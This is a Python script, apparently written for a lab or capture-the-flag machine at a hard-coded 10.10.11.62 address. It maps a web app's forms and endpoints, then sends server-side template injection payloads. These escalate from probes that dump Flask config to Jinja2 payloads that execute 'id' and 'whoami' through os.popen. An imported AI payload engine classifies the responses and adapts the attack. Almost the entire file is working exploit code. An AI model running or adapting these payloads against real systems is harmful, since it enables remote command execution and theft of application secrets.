#!/usr/bin/env python3
import asyncio
import requests
from app.core.ai_payload_engine import AIPayloadEngine, ResponseType

async def enhanced_ai_ssti_test():
    """Enhanced AI SSTI test with POST requests and form discovery"""
    target_url = "http://10.10.11.62:5000"
    
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    })
    
    ai_engine = AIPayloadEngine()
    
    print("Enhanced AI-Driven SSTI Test")
    print("="*40)
    print(f"Target: {target_url}")
    
    # First, discover the actual application structure
    print("\n[RECONNAISSANCE] Discovering application structure...")
    try:
        response = session.get(target_url, timeout=10)
        print(f"Main page status: {response.status_code}")
        print(f"Content length: {len(response.text)}")
        
        # Look for forms in the HTML
        import re
        forms = re.findall(r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>', response.text, re.IGNORECASE)
        if forms:
            print(f"Found forms: {forms}")
        
        # Look for input fields
        inputs = re.findall(r'<input[^>]*name=["\']([^"\']*)["\'][^>]*>', response.text, re.IGNORECASE)
        if inputs:
            print(f"Found input fields: {inputs}")
        
        # Look for JavaScript endpoints
        js_endpoints = re.findall(r'["\'](/[^"\']*)["\']', response.text)
        unique_endpoints = list(set([ep for ep in js_endpoints if len(ep) > 1 and not ep.startswith('http')]))
        if unique_endpoints:
            print(f"Found potential endpoints: {unique_endpoints[:10]}")
    
    except Exception as e:
        print(f"Reconnaissance failed: {e}")
    
    # Test with POST requests (more likely to have SSTI)
    print("\n[AI TESTING] Testing with POST requests...")
    
    test_params = ['code', 'input', 'data', 'template', 'content']
    
    for param in test_params:
        print(f"\nTesting POST parameter: {param}")
        
        # Generate adaptive payloads
        payloads = [
            '{{7*7}}',
            '${7*7}',
            '<%=7*7%>',
            '{{config}}',
            '{{request}}',
            '{{url_for.__globals__}}'
        ]
        
        for payload in payloads:
            try:
                # POST request
                response = session.post(target_url, data={param: payload}, timeout=5)
                
                response_data = {
                    'status_code': response.status_code,
                    'content': response.text,
                    'headers': dict(response.headers)
                }
                
                # AI classification
                result_type, next_payload = ai_engine.process_response_and_adapt(
                    target_url, payload, response_data
                )
                
                print(f"  Payload: {payload}")
                print(f"  Status: {response.status_code}")
                print(f"  Classification: {result_type.value}")
                print(f"  Content preview: {response.text[:100]}...")
                
                # Check for specific indicators
                if '49' in response.text and payload in ['{{7*7}}', '${7*7}', '<%=7*7%>']:
                    print(f"  POTENTIAL SSTI: Math evaluation detected!")
                
                if 'SECRET_KEY' in response.text or 'DEBUG' in response.text:
                    print(f"  CRITICAL: Flask config exposed!")
                
                if result_type == ResponseType.EVALUATED:
                    print(f"  AI CONFIRMED: Template evaluation detected!")
                    
                    # Try advanced payloads
                    advanced_payloads = [
                        "{{config.items()}}",
                        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
                        "{{url_for.__globals__['__builtins__']['__import__']('os').popen('whoami').read()}}"
                    ]
                    
                    for adv_payload in advanced_payloads:
                        try:
                            adv_response = session.post(target_url, data={param: adv_payload}, timeout=5)
                            if 'uid=' in adv_response.text or 'root' in adv_response.text:
                                print(f"  COMMAND EXECUTION: {adv_payload}")
                                print(f"  Output: {adv_response.text[:200]}...")
                        except:
                            continue
                
                print()
                
            except Exception as e:
                print(f"  Error: {str(e)}")
                continue
    
    # Show AI learning results
    intelligence = ai_engine.get_target_intelligence(target_url)
    print(f"\n[AI INTELLIGENCE] Final analysis:")
    print(f"  Blocked tokens: {intelligence['blocked_tokens']}")
    print(f"  Working bypasses: {len(intelligence['working_bypasses'])}")
    print(f"  Successful payloads: {len(intelligence['successful_payloads'])}")
    print(f"  Recommended approach: {intelligence['recommended_approach']}")
    
    return len(intelligence['successful_payloads']) > 0

if __name__ == "__main__":
    result = asyncio.run(enhanced_ai_ssti_test())
    if result:
        print("\n[RESULT] SSTI vulnerabilities confirmed by AI!")
    else:
        print("\n[RESULT] No SSTI vulnerabilities detected.")